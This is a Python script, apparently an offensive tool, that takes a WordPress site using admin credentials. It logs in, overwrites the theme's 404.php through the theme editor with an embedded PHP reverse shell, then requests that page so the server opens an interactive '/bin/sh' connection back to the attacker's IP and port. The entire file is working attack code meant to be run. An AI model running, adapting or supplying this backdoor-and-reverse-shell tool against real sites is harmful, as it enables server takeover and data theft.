from pwn import log
import requests
import argparse
import re

SESSION = requests.Session()
THEME = ""
TRIGGER = ""
PAYLOAD = """
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = 'CHANGEIP';  // CHANGE THIS
$port = CHANGEPORT;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?> 
"""

def parse_args() -> tuple:
    parser = argparse.ArgumentParser(description="Get a reverse shell from a WordPress website")
    parser.add_argument("-u", "--url", help="The WordPress full path url", required=True)
    parser.add_argument("-au", "--admin-username", help="The WordPress admin username", required=True)
    parser.add_argument("-ap", "--admin-password", help="The WordPress admin password", required=True)
    
    parser.add_argument("-i", "--ip", help="Your local ip for the reverse shell", required=True)
    parser.add_argument("-p", "--port", type=int, help="Your local port for the reverse shell", required=True)
    args = parser.parse_args()

    if(not args.url.startswith("http")):
        log.error("Missing schema (http:// | https://)")
        log.info("Adding http:// ...")
        args.url = "http://" + args.url

    if(not args.url.endswith("/")):
        args.url += "/"

    global PAYLOAD
    PAYLOAD = PAYLOAD.replace("CHANGEIP", args.ip).replace("CHANGEPORT", str(args.port))

    return args.url, args.admin_username, args.admin_password


def extract_value(input: str) -> str:
    return input.split("value=")[1].split('"')[1]


def do_login(target :str, wp_user: str, wp_pass: str) -> bool:
    SESSION.post(f"{target}wp-login.php", data = {
        "log": wp_user,
        "pwd": wp_pass,
        "wp-submit": "Submit"
    })

    if(len(SESSION.cookies) <= 1):
        return False
    
    return True

def get_edition_page(target) -> str:
    pages_url = SESSION.get(f"{target}wp-admin/theme-editor.php").text
    try:
        unparsed_url = re.findall(".*404.php.*", pages_url)[0]
    except IndexError:
        return ""
    
    return unparsed_url.split('"')[1]

def do_backdoor(target: str, link: str):
    content = SESSION.get(link).text

    hidden_inputs = re.findall('<input type="hidden" .*?/>', content)

    global THEME, TRIGGER
    THEME = extract_value(hidden_inputs[4])
    TRIGGER = extract_value(hidden_inputs[3])
    data = {
        "nonce": extract_value(hidden_inputs[0]),
        "_wp_http_referer": extract_value(hidden_inputs[1]),
        "newcontent": PAYLOAD,
        "action": "edit-theme-plugin-file",
        "file": TRIGGER,
        "theme": THEME,
        "docs-list": "",
    }
    return '"success":true' in SESSION.post(f"{target}wp-admin/admin-ajax.php", data=data).text

def trigger_backdoor(target: str):
    trigger_url = f"{target}wp-content/themes/{THEME}/{TRIGGER}"
    log.info("GET " + trigger_url)
    SESSION.get(trigger_url)


def main(target: str, wp_user: str, wp_pass: str) -> bool:
    log.info(f"Targeting {target} with {wp_user}:{wp_pass} ...")
    
    if(not do_login(target, wp_user, wp_pass)):
        log.critical("Failed to authenticate")
        return False

    log.success(f"Authentication succeeded")


    editable = get_edition_page(target)
    if(editable == ""):
        log.critical("404.php not found, cannot get a shell")
        return False
    
    log.success(f"Found editable 404.php at {editable}")


    if(not do_backdoor(target, editable)):
        log.critical("Could not edit the 404.php page")
        return False
    
    log.success(f"Backdoored successfully ...")

    log.info("Triggering backdoor ...")
    trigger_backdoor(target)
    log.success("Done")


if __name__ == "__main__":
    target, wp_user, wp_pass = parse_args()
    main(target, wp_user, wp_pass)